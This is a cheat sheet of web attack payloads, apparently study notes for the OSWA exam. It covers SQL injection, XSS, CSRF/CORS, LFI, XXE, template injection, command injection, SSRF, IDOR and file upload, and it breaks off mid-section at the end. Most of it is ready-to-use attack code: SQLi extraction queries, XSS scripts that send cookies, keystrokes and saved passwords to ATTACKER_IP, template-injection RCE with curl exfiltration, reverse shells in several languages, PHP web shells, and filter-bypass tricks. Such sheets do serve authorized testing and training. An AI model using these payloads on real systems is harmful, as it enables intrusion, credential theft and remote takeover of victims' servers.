Up::
Reference::
Tags:: #AppSec/WebApp/Payloads #AppSec/ServerSide/SQLi #AppSec/OSWA
Date:: 2026-06-02

---

# OSWA Commands & Payloads

> Last updated: 2026-06-03
> Cross-referenced with: PortSwigger Academy, OWASP Testing Guide v5, HackTricks, PayloadsAllTheThings

## Table of Contents

| Section | Lines | Topics |
|---------|:---:|--------|
| [Enumeration & Reconnaissance](#enumeration--reconnaissance) | 10-28 | Nmap, whatweb, ffuf, cewl |
| [SQL Injection](#sql-injection) | 30-325 | Discovery, DBMS fingerprinting, enumeration (MySQL/MSSQL/PostgreSQL/Oracle), error-based, UNION, blind (boolean/time), stacked queries, file read/write, sqlmap, fuzzing |
| [Cross-Site Scripting (XSS)](#cross-site-scripting-xss) | 328-472 | Discovery, remote script loading, xss.js payloads, jQuery/Base64 bypass, filter bypass (polyglot, event handlers, context breakout), DOM sinks |
| [Cross-Origin Attacks (CSRF & CORS)](#cross-origin-attacks-csrf--cors) | 474-532 | CSRF detection, auto-submit form, fetch-based multi-step, CORS misconfig |
| [Command Injection](#command-injection) | 534-570 | OS command injection, operators, filter bypass |
| [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti) | 572-618 | Jinja2, Twig, Freemarker, Pug RCE |
| [Server-Side Request Forgery (SSRF)](#server-side-request-forgery-ssrf) | 620-664 | Internal probes, cloud metadata, IP obfuscation |
| [Local File Inclusion (LFI)](#local-file-inclusion-lfi) | 666-730 | Path traversal, PHP wrappers, log poisoning, fuzzing |
| [XML External Entities (XXE)](#xml-external-entities-xxe) | 732-790 | In-band, OOB, escalation |
| [Insecure Direct Object Reference (IDOR)](#insecure-direct-object-reference-idor) | 792-840 | Predictable IDs, encoded IDs, brute force |
| [File Upload](#file-upload) | 842-930 | Bypass techniques, webshells, magic bytes |
| [Authentication Attacks](#authentication-attacks) | 932-1020 | JWT, OAuth, SAML, session fixation, password reset, 2FA |
| [API Testing](#api-testing) | 1022-1150 | REST, GraphQL, WebSocket, rate limiting |
| [WAF Bypass](#waf-bypass) | 1152-1234 | SQLi, XSS, generic bypass techniques |
| [URL Encoding Quick Reference](#url-encoding-quick-reference) | 1235-1241 | Character encoding table |

### Enumeration & Reconnaissance

```bash
# Flyover
rustscan -a [target] -r 1-65535 -b 2094 --ulimit 5000 -- -Pn -sC -sV 

./recon-scan recon-scan host1,host2,host3,host4,host5 

# Directory Busting
feroxbuster -u http://TARGET -w $(wordlists_path)/seclists/Discovery/Web-Content/raft-large-directories.txt --thorough 

# Wordlist generation
cewler [URL] -w custom.txt
ls /usr/bin | grep -v "/" | anew custom.txt

# Nmap
nmap -Pn -O [target]
nmap -sV [target]
nmap --script http-methods [target]

# Banner grabbing
curl -I [target]
netcat -v [target] [port]

# Automated fuzzing
ffuf -w users.txt -u http://TARGET/auth/login -X POST \
  -d 'username=FUZZ&password=bar' -H 'Content-Type: application/x-www-form-urlencoded'

```

---

### SQL Injection

#### Discovery — Break & Repair

Inject a single quote (`'`). If you get a 500 error, confirmed injection point. Inject a second quote (`''`). If 200 returns, confirmed string context.

Determine injection context:

| Payload | Context |
|---------|---------|
| `' -- -` | Simple string |
| `') -- -` | Grouped query |
| `')) -- -` | Nested query |
| `" -- -` | Double-quoted string |
| `") -- -` | Double-quoted grouped |
| `")) -- -` | Double-quoted nested |
| ` AND 1=1` | Integer (leading space) |
| ` -- -` | Integer (leading space) |
| ` AND 1=1 -- -` | Integer (leading space) |

#### DBMS Fingerprinting

```sql
' AND 'foo' 'bar' = 'foobar       -- MySQL (space concatenation)
' OR 1=CAST((@@version) AS INT)-- -- MSSQL/PostgreSQL error-based
' WAITFOR DELAY '0:0:5' --        -- MSSQL time delay
' AND 1=1 --                        -- Oracle compatible
```

#### DBMS-Specific Enumeration

**MySQL**
```sql
SELECT version();
SELECT current_user();
SELECT system_user();
SELECT table_schema FROM information_schema.tables GROUP BY table_schema;
SELECT table_name FROM information_schema.tables WHERE table_schema = 'app';
SELECT column_name, data_type FROM information_schema.columns
  WHERE table_schema = 'app' AND table_name = 'menu';
SHOW DATABASES;
```

**MSSQL**
```sql
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT name FROM sys.databases;
SELECT * FROM app.information_schema.tables;
SELECT * FROM app.sys.tables;
SELECT COLUMN_NAME, DATA_TYPE FROM app.information_schema.columns
  WHERE TABLE_NAME = 'menu';
```

**PostgreSQL**
```sql
SELECT version();
SELECT current_user;
SELECT datname FROM pg_database;
SELECT table_name FROM app.information_schema.tables
  WHERE table_schema = 'public';
SELECT column_name, data_type FROM app.information_schema.columns
  WHERE table_name = 'menu';
```

**Oracle**
```sql
SELECT * FROM v$version;
SELECT user FROM dual;
SELECT owner FROM all_tables GROUP BY owner;
SELECT table_name FROM all_tables WHERE owner = 'SYS' ORDER BY table_name;
SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'MENU';
SELECT * FROM SYS.HIDDENSECRETTABLE;
```

#### Error-Based Payloads

**MSSQL / PostgreSQL — CAST conversion error**
```sql
FOOBARBAZ')) OR 1=CAST((@@version) AS INT) -- -
FOOBARBAZ')) AND 1=CAST((SELECT name FROM master.sys.databases
  ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) AS INT) -- -
FOOBARBAZ')) AND 1=CAST((SELECT name FROM exercise.sys.tables
  ORDER BY name OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) AS INT) -- -
FOOBARBAZ')) AND 1=CAST((SELECT TOP 1 name FROM app.sys.tables
  WHERE name NOT IN ('menu')) AS INT) -- -
FOOBARBAZ')) AND 1=CAST((SELECT name FROM app.sys.columns
  WHERE object_id = OBJECT_ID('app..flags')
  ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) AS INT) -- -
FOOBARBAZ')) AND 1=CAST((SELECT flag FROM app..flags
  ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY) AS INT) -- -
```

**MySQL — ExtractValue / UpdateXML**
```sql
extractvalue('',concat('>',version()))
ExtractValue(1, CONCAT(0x7e, @@version))
ExtractValue(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(table_schema)
  FROM (SELECT table_schema FROM information_schema.tables
  GROUP BY table_schema) AS foo)))
ExtractValue(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name)
  FROM (SELECT table_name FROM information_schema.tables
  WHERE table_schema='piwigo') AS foo)))
ExtractValue(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(column_name)
  FROM (SELECT column_name FROM information_schema.columns
  WHERE table_schema='piwigo' AND table_name='piwigo_users') AS foo)))
ExtractValue(1, CONCAT(0x7e,(SELECT GROUP_CONCAT(username,password)
  FROM (SELECT username,password FROM piwigo_users LIMIT 1) AS foo)))
ExtractValue(1, CONCAT(0x7e,(SELECT SUBSTRING(password,1,32)
  FROM piwigo_users LIMIT 1 OFFSET 0)))
```

**Oracle — dbms_xmlgen**
```sql
to_char(dbms_xmlgen.getxml('select "'||
  (select substr(banner,0,30) from v$version where rownum=1)
  ||'" from sys.dual'))
```

#### UNION-Based Payloads

**Column count discovery**
```sql
UNION SELECT null -- -
UNION SELECT null,null -- -
UNION SELECT null,null,null -- -
UNION SELECT null,null,null,null -- -
```

**PostgreSQL — concatenate values into single column**
```sql
UNION SELECT null,STRING_AGG(username || password, '~') FROM users-- -
```

**MySQL UNION flow**
```sql
FOOBARBAZ')) UNION SELECT null, @@version, null, null-- -
FOOBARBAZ')) UNION SELECT null, DATABASE(), null, null-- -
FOOBARBAZ')) UNION SELECT null, db, null, null FROM mysql.db-- -
FOOBARBAZ')) UNION SELECT null, schema_name, null, null
  FROM INFORMATION_SCHEMA.SCHEMATA-- -
FOOBARBAZ')) UNION SELECT null, table_name, null, null
  FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='exercise'-- -
FOOBARBAZ')) UNION SELECT null, column_name, column_type, null
  FROM INFORMATION_SCHEMA.COLUMNS
  WHERE table_name='secrets' AND table_schema='exercise'-- -
FOOBARBAZ')) UNION SELECT id, flag, null, null FROM secrets-- -
```

**MSSQL UNION**
```sql
UNION ALL SELECT 1,user FROM mysql.user-- -
UNION ALL SELECT 1,GROUP_CONCAT(user,0x3a,file_priv) FROM mysql.user
```

#### Blind SQLi (Boolean / Time-Based)

**Boolean-based character extraction**
```sql
AND LENGTH(database())=0
AND ASCII(SUBSTRING(database(),1,1))=0

AND LENGTH((SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1))=0
AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1),1,1))=0

AND LENGTH((SELECT column_name FROM information_schema.columns
  WHERE table_schema=database() LIMIT 0,1))=0
AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns
  WHERE table_schema=database() LIMIT 0,1),1,1))=0

AND LENGTH((SELECT flag FROM flags LIMIT 0,1))=0
AND ASCII(SUBSTRING((SELECT flag FROM flags LIMIT 0,1),1,1))=0
```

**Time-based**
```sql
AND SLEEP(10)=0                     -- MySQL
FOOBARBAZ; SELECT pg_sleep(5)-- -   -- PostgreSQL
WAITFOR DELAY '0:0:5'               -- MSSQL
```

#### Stacked Queries

**MSSQL — enable xp_cmdshell for RCE**
```sql
FOOBARBAZ'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';--

FOOBARBAZ'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXECUTE xp_cmdshell 'whoami';--
```

**MSSQL — xp_cmdshell payloads**
```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'curl http://ATTACKER_IP:8000/itworked';
EXEC xp_cmdshell 'curl http://ATTACKER_IP:8000/RevShell.java
  --output %temp%/RevShell.java';
EXEC xp_cmdshell 'java %temp%/RevShell.java';
```

**PostgreSQL stacked queries**
```sql
FOOBARBAZ; SELECT pg_sleep(5)-- -
FOOBARBAZ; SELECT VERSION()-- -
FOOBARBAZ; SELECT datname FROM pg_database-- -
FOOBARBAZ; SELECT current_database()-- -
FOOBARBAZ; SELECT tablename FROM pg_tables
  WHERE schemaname = 'public'-- -
FOOBARBAZ; SELECT table_name FROM information_schema.tables
  WHERE table_schema='public'-- -
FOOBARBAZ; SELECT column_name,data_type FROM information_schema.columns
  WHERE table_schema='public' AND table_name='flags'-- -
FOOBARBAZ; SELECT flag FROM flags-- -
```

#### Reading & Writing Files

**PostgreSQL**
```sql
SELECT pg_read_file('/tmp/flag.txt')

CREATE TABLE tmp(data text);
COPY tmp FROM '/etc/passwd';
SELECT * FROM tmp;
```

**MySQL**
```sql
SELECT @@GLOBAL.secure_file_priv

UNION ALL SELECT 1,LOAD_FILE('/var/lib/mysql-files/flag.txt')
  FROM mysql.user
UNION ALL SELECT 1,LOAD_FILE('/etc/passwd') FROM mysql.user

UNION ALL SELECT 1,"TESTING" INTO OUTFILE '/var/www/html/test.txt'
UNION ALL SELECT 1,"<?php system($_GET['cmd']); ?>"
  INTO OUTFILE '/var/www/html/shell.php'

UNION ALL SELECT 1,GROUP_CONCAT(user,0x3a,file_priv) FROM mysql.user
```

#### sqlmap Reference

```bash
# Basic
sqlmap -u "URL" --batch --level=3
sqlmap -u "URL" --batch --level=3 --dump

# Authenticated
sqlmap -u "URL" --cookie="PHPSESSID=xxx" --batch --dump
sqlmap -r request.txt --batch --dump

# Technique selection (faster than auto-detect)
--technique=U    # UNION only
--technique=B    # Boolean blind
--technique=T    # Time-based (use --time-sec=2)
--technique=E    # Error-based
--technique=S    # Stacked queries

# Database enumeration
--dbs
-D dbname --tables
-D dbname -T users --columns
-D dbname -T users --dump
-D dbname -T users -C username,password --dump

# OS access
--os-shell
--os-cmd="whoami"
--file-read="/etc/passwd"
--file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Aggressive / WAF bypass
--level=5 --risk=3 --threads=3
--random-agent
--tamper=space2comment
--tamper=between,space2comment

# Session management
--flush-session
--fresh-queries
```

#### Fuzzing for SQLi
```bash
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -d "db=mysql&id=FUZZ" -u http://TARGET/api/intro
```

---

### Cross-Site Scripting (XSS)

#### Discovery
```html
<h1></h1>
<img src=x onerror='alert(1111)'>
```

#### Remote Script Loading

**innerHTML-safe (via onerror)**
```html
<img src=x onerror="s=document.createElement('script');
  s.src='http://ATTACKER_IP/xss.js';
  document.head.appendChild(s);">
```

**Standard script include**
```html
<script src="http://ATTACKER_IP/xss.js"></script>
```

#### xss.js Payloads

**Steal session cookies**
```js
let cookie = document.cookie;
let encodedCookie = encodeURIComponent(cookie);
fetch("http://ATTACKER_IP/exfil?data=" + encodedCookie);
```

**Steal local storage**
```js
let data = JSON.stringify(localStorage)
let encodedData = encodeURIComponent(data)
fetch("http://ATTACKER_IP/exfil?data=" + encodedData)
```

**Keylogging**
```js
function logKey(event){
    fetch("http://ATTACKER_IP/k?key=" + event.key)
}
document.addEventListener('keydown', logKey);
```

**Steal saved passwords (password manager auto-fill trap)**
```js
let body = document.getElementsByTagName("body")[0]
var u = document.createElement("input");
u.type = "text"; u.style.position = "fixed"; u.style.opacity = "0";
var p = document.createElement("input");
p.type = "password"; p.style.position = "fixed"; p.style.opacity = "0";
body.append(u); body.append(p);
setTimeout(function(){
  fetch("http://ATTACKER_IP/k?u=" + u.value + "&p=" + p.value)
}, 5000);
```

**Phishing — replace login page**
```js
fetch("login").then(res => res.text().then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data
    document.getElementsByTagName("form")[0].action = "http://ATTACKER_IP"
    document.getElementsByTagName("form")[0].method = "get"
}))
```

#### jQuery.getScript with Base64 (bypass filters)

```js
// Raw
jQuery.getScript('http://ATTACKER_IP/xss.js')

// Base64 payload: use atob + eval to execute
alF1ZXJ5LmdldFNjcmlwdCgnaHR0cDovLzE5Mi4xNjguNDUuMjM5L3hzcy5qcycp

// Inject via eval
'+eval(atob('alF1ZXJ5LmdldFNjcmlwdCh...'))+'

// Wrap with btoa to avoid special char breakage
'+btoa(eval(atob('alF1ZXJ5LmdldFNjcmlwdCh...')))+'
```

#### Filter Bypass Payloads

**Polyglot (test multiple contexts)**
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert(1) )//
%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

**Event handler variants (bypass `<script>` filters)**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)>
<marquee onstart=alert(1)>
<select onfocus=alert(1) autofocus>
```

**Attribute context breakout**
```html
" autofocus onfocus=alert(1) x="
' onfocus=alert(1) autofocus x='
"><img src=x onerror=alert(1)>
```

**JavaScript context breakout**
```js
';alert(1)//
';alert(1)//'
"-alert(1)-"
</script><img src=x onerror=alert(1)>
```

**Template literal context**
```js
${alert(1)}
${fetch('http://ATTACKER/?c='+document.cookie)}
```

**href/src context**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

#### Client-Side XSS Discovery

Look for insecure DOM sinks: `innerHTML`, `append()`, `document.write()`, `$()` / jQuery HTML construction from user input.

Typical vulnerable patterns:
```js
document.getElementById("welcome").innerHTML = "Welcome, " + params.name
$('#data').append(`<tr><td>${key}</td><td>${value}</td></tr>`);
$('<div class="todo-item"><span>' + task + '</span></div>').insertAfter(...)
```

---

### Cross-Origin Attacks (CSRF & CORS)

#### CSRF Detection

Inspect HTML forms for hidden CSRF token fields (look for `csrf`, `token`). Check cookies for `SameSite` attribute (missing = Lax in Chrome). No token + SameSite missing or `None` → potentially vulnerable.

#### CSRF Payload — Auto-Submit Form
```html
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://TARGET/endpoint" method="post"
        name="csrf" target="_blank">
    <input type="hidden" name="param1" value="attacker_value">
    <input type="hidden" name="param2" value="attacker_value">
  </form>
</body>
</html>
```

#### CSRF Payload — Fetch API (sequential requests)
```html
<html><head><script>
  var host = "https://TARGET";
  var create_url = "/endpoint1";
  var admin_url = "/endpoint2";
  var create_params = "param1=val1&param2=val2";
  var admin_params = "param1=val1&param2=val2";

function send_create() {
  fetch(host+create_url, {
    method: 'POST', mode: 'no-cors', credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body : create_params
  }).then(function(response) { send_admin(); });
}

function send_admin() {
  fetch(host+admin_url, {
    method: 'POST', mode: 'no-cors', credentials: 'include',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body : admin_params
  }).then(console.log("Done"));
}

send_create();
</script></head><body></body></html>
```

#### CORS — Trusting Any Origin
```html
<html><head><script>
var url = "https://TARGET/protected/endpoint";
function get_code() {
  fetch(url, {method: 'GET', mode: 'cors', credentials: 'include'})
  .then(response => response.json())
  .then(data => {
    fetch('http://ATTACKER_IP/callback?' +
      encodeURIComponent(JSON.stringify(data)), {mode: 'no-cors'});
  });
}
get_code();
</script></head><body></body></html>
```

#### CORS — Domain Allowlist Bypass

If domain ends with target suffix (e.g., `offensive-security.com`), register `attacker-offensive-security.com`. If domain starts with target prefix, register `offensive-security.com.attacker.com`.

---

### Directory Traversal (LFI/RFI)

#### Suggestive Parameters
```
?file=    ?f=     /file/someFile
?location=  ?l=     /location/someLocation
?search=  ?s=     /search/someSearch
?data=    ?d=     /data/someData
?download=  ?d=     /download/someFileData
```

#### Basic Payloads
```
../../etc/passwd
..\..\windows\win.ini
C:\\windows\win.ini
```

#### URI Normalization Bypass
```
..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%2F..%2F..%2F..%2F..%2Fconfig%2Fconfiguration.yaml
..%2F..%2F..%2F..%2F..%2Fconfig%2Fsecrets.yaml
```

#### Fuzzing
```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  http://TARGET/relativePathing.php?path=../../../../../../../../../../FUZZ

wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  --hc 404 --hh 81,125 \
  http://TARGET/relativePathing.php?path=../../../../../../FUZZ

wfuzz -w paths.txt -w files.txt --hh 0 \
  http://TARGET/specials?menu=FUZZFUZ2Z
```

#### Key Target Files
```
/etc/passwd  /etc/shadow  /root/flag.txt  /tmp/flag.txt
/config/configuration.yaml  /config/secrets.yaml
/config/.storage/auth  /config/application.properties
../config/application.properties  ../../config/application.yml
C:\windows\win.ini
```

---

### XML External Entities (XXE)

#### Testing (in-band)
```xml
<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

#### File Read (in-band)
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///etc/passwd">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

#### File Read — Element Injection (OFBiz-style)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ELEMENT data ANY >
  <!ENTITY inject SYSTEM "file:///etc/passwd">
]>
<entity-engine-xml>
    <Product createdStamp="..." productId="XXE-001">
        <longDescription>&inject;</longDescription>
    </Product>
</entity-engine-xml>
```

#### OOB Exfiltration

**Host external.dtd on attacker server:**
```xml
<!ENTITY % content SYSTEM "file:///root/oob.txt">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM
  'http://ATTACKER_IP/out?%content;'>" >
```

**Payload sent to target:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://ATTACKER_IP/external.dtd">
%base; %external; %exfil;
]>
<entity-engine-xml></entity-engine-xml>
```

#### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "http://ATTACKER_IP/somefile">
]>
<Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</Contact>
```

---

### Server-Side Template Injection (SSTI)

#### Detection

| Payload | If Output | Likely Engine |
|---------|-----------|---------------|
| `{{5*5}}` | `25` | Jinja, Twig, etc |
| `{{5*'5'}}` | `25` | Twig (PHP) |
| `{{5*'5'}}` | `55555` | Jinja (Python) |
| `${7*7}` | `49` | Freemarker (Java) |
| `${7*'7'}` | error | Freemarker (Java) |
| `#{"7"*7}` | `49` | Pug (NodeJS) |

#### Jinja2 RCE (Python)

```python
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__.os.popen('whoami').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__['json']
  .JSONEncoder.__init__.__globals__['os'].popen('id').read()}}
```

**Object traversal**
```python
{{''.__class__.__mro__}}
{{''.__class__.__mro__[1].__subclasses__()}}
# Find <class 'subprocess.Popen'> in list, note index
{{''.__class__.__mro__[1].__subclasses__()[258]
  ('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip()}}
```

**Blind exfiltration**
```python
{% set exfil = cycler.__init__.__globals__.os.popen('whoami').read() %}
{{cycler.__init__.__globals__.os.popen(
  'curl http://ATTACKER_IP/?d=' + exfil).read()}}
```

**Info disclosure**
```python
{{config|pprint}}
{{request}}
{{session}}
```

#### Twig (PHP) RCE
```twig
{{[0]|reduce('system','whoami')}}
{{['id']|filter('system')}}
{{['cat index.php']|map('system')|join}}
```

**Blind OOB (Craft CMS example)**
```php
{% set exfil = "Hello & Goodbye"| url_encode %}
{{[0]|reduce('system','curl http://ATTACKER_IP/?exfil=' ~ exfil)}}

{% set output %}{{[0]|reduce('system','whoami')}}{% endset %}
{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://ATTACKER_IP/?exfil=' ~ exfil)}}

{% set output %}{{[0]|reduce('system','cat /etc/passwd')}}{% endset %}
{% set exfil = output| url_encode %}
{{[0]|reduce('system','curl http://ATTACKER_IP/?exfil=' ~ exfil)}}
```

#### Freemarker (Java) RCE
```java
${"freemarker.template.utility.Execute"?new()("whoami")}
${"freemarker.template.utility.Execute"?new()
  ("curl http://ATTACKER_IP/shell.sh -o shell.sh")}
${"freemarker.template.utility.Execute"?new()("chmod +x shell.sh")}
${"freemarker.template.utility.Execute"?new()("./shell.sh")}
```

**In templates (Halo CMS)**
```java
<#assign test="freemarker.template.utility.Execute"?new()>
${test("touch /tmp/freemarkerPwned")}
```

#### Pug (NodeJS) RCE
```pug
= require
= global.process.mainModule.require

- var require = global.process.mainModule.require
= require('child_process')
= require('child_process').spawnSync('whoami').stdout
= require('child_process').spawnSync('cat', ['/root/flag.txt']).stdout
```

#### Handlebars File Read
```hbs
{{read "/etc/passwd"}}
{{#each (readdir "/etc")}}
    {{this}}
{{/each}}
```

---

### Command Injection

#### Operators
```
;     |     ||     &&     ` `     $()
```

#### Reverse Shells

**Bash**
```
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/PORT+0>%261'
```

**Netcat (with -e)**
```bash
nc -nv ATTACKER_IP PORT -e /bin/bash
http://TARGET?ip=127.0.0.1|/bin/nc%20-nv%20ATTACKER_IP%20PORT%20-e%20/bin/bash
```

**Python**
```python
python -c 'import socket,subprocess,os;
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
  s.connect(("ATTACKER_IP",PORT));
  os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  p=subprocess.call(["/bin/sh","-i"]);'
```

**NodeJS**
```bash
echo "require('child_process').exec('nc -nv ATTACKER_IP PORT -e /bin/bash')" \
  > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```

**PHP**
```php
php -r '$sock=fsockopen("ATTACKER_IP",PORT);
  exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);
  shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);
  system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER_IP",PORT);
  passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r "system(\"bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'\");"
```

**Perl**
```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;
  socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
  if(connect(S,sockaddr_in($p,inet_aton($i))))
  {open(STDIN,">&S");open(STDOUT,">&S");
  open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Filter Bypass Techniques

**Null statement injection**
```
whoami          → blocked
wh$()oami       → bypass
wh$()oami       → bypass
http://TARGET?ip=127.0.0.1;wh$()oami
```

**Base64 command bypass**
```bash
echo 'cat /etc/passwd' | base64
http://TARGET/blocklisted.php?ip=127.0.0.1;`echo%20"Y2F0...==%20|base64%20-d`
```

**Newline injection (bypass space stripping)**
```
127.0.0.1%0awhoami
127.0.0.1%0d%0awhoami
```

**IFS (Internal Field Separator) — replaces spaces**
```
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
```

**Null byte injection**
```
whoami%00
cat%00 /etc/passwd
```

**Hex/Octal encoding**
```bash
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
$'\x63\x61\x74' /etc/passwd
```

**Environment variable substitution**
```bash
c=ca; t=t; $c$t /etc/passwd
wh$()oami
wh$1oami
```

**Case manipulation (Windows)**
```
WhoAmi  wHoAmI
```

**Tab as separator**
```
cat%09/etc/passwd
```

#### File Transfer via Command Injection
```bash
wget http://ATTACKER_IP:80/nc -O /var/tmp/nc
chmod 755 /var/tmp/nc
/var/tmp/nc -nv ATTACKER_IP PORT -e /bin/bash
```

#### Web Shell via Command Injection
```bash
echo "<pre><?php passthru(\$_GET['cmd']); ?></pre>" \
  > /var/www/html/webshell.php
# Access: http://TARGET/webshell.php?cmd=ls -lsa
```

#### Blind Detection
```bash
time curl "http://TARGET/blind.php?ip=127.0.0.1;sleep%2020"
```

#### Capability Enumeration
```bash
echo "wget curl fetch gcc cc nc socat ping netstat ss ifconfig ip
  hostname php python python3 perl java" > capability_checks_custom.txt

wfuzz -c -z file,capability_checks_custom.txt --hc 404 \
  "http://TARGET/index.php?ip=127.0.0.1;which FUZZ"
```

#### Custom Fuzzing Wordlist
```
bogus
;id
||id
`id`
i$()d
;i$()d
||i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`id`
$(sleep 5)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```

---

### Server-Side Request Forgery (SSRF)

#### Loopback Probing
```
http://localhost/status
http://127.0.0.1:8080
http://127.0.0.1:22
```

#### Cloud Metadata Endpoints
```
http://169.254.169.254/latest/meta-data/       # AWS
http://169.254.169.254/computeMetadata/v1/     # GCP
http://metadata.google.internal/                # GCP DNS
```

#### Alternative URL Schemes

**file://**
```
file:///etc/passwd
file:/tmp/foo.txt
```

**gopher:// (HTTP request injection)**
```bash
curl gopher://127.0.0.1:9000/hello_gopher
curl gopher://127.0.0.1:9000/_GET%20/hello_gopher%20HTTP/1.1
curl gopher://backend:80/_POST%20/login%20HTTP/1.1%0D%0A
  Host%3A%20127.0.0.1%0D%0A
  Content-Type%3A%20application/x-www-form-urlencoded%0D%0A
  Content-Length%3A%2041%0D%0A%0D%0A
  username%3Dwhite.rabbit%26password%3Ddontbelate%0D%0A
```

When SSRF is triggered via a web parameter, double-encoding may be needed.

#### File Upload Bypass (GroupOffice example)

1. Send `GET /api/upload.php` with SSRF payload using `file:///etc/passwd`
2. Copy the returned `id` parameter
3. Access `/api/download` endpoint and replace `blob` parameter with captured `id`

---

### Insecure Direct Object Reference (IDOR)

#### Detection Patterns
```
?f=1.txt  →  ?f=2.txt  →  ?f=3.txt
?id=11    →  ?id=12    →  ?id=13
?uid=12345
/users/:userId/documents/:pdfFile
```

#### Brute Forcing
```bash
# Establish baseline
curl -s /dev/null http://TARGET/user/?uid=91191 -w '%{size_download}' \
  --header "Cookie: PHPSESSID=SESSION_ID"

# Fuzz 5-digit range
wfuzz -c -z file,/usr/share/seclists/Fuzzing/5-digits-00000-99999.txt \
  --hc 404 --hh 2873 \
  -H "Cookie: PHPSESSID=SESSION_ID" http://TARGET/user/?uid=FUZZ
```

#### Base64-Encoded IDOR
```bash
ffuf -u "http://TARGET" -w wordlist -enc FUZZ:b64encode \
  -H "Cookie: COOKIE"
```


### File Upload

**Bypass file type restrictions**
```
shell.php.jpg          # Double extension
shell.jpg.php          # Alternate
shell.php%00.jpg       # Null byte (older PHP)
# MIME: change Content-Type to image/jpeg
# Magic bytes: add GIF89a; at file start, save as .php
```

**Web shells**
```php
<?php system($_GET['cmd']); ?>
<?php system($_REQUEST['cmd']); ?>
<?=`$_GET[0]`?>
```

**.htaccess upload (if allowed)**
```
AddType application/x-httpd-php .jpg
# Then upload PHP as .jpg — executes as PHP
```

**SVG XSS via upload**
```xml
<?xml version="1.0" standalone="no"?>
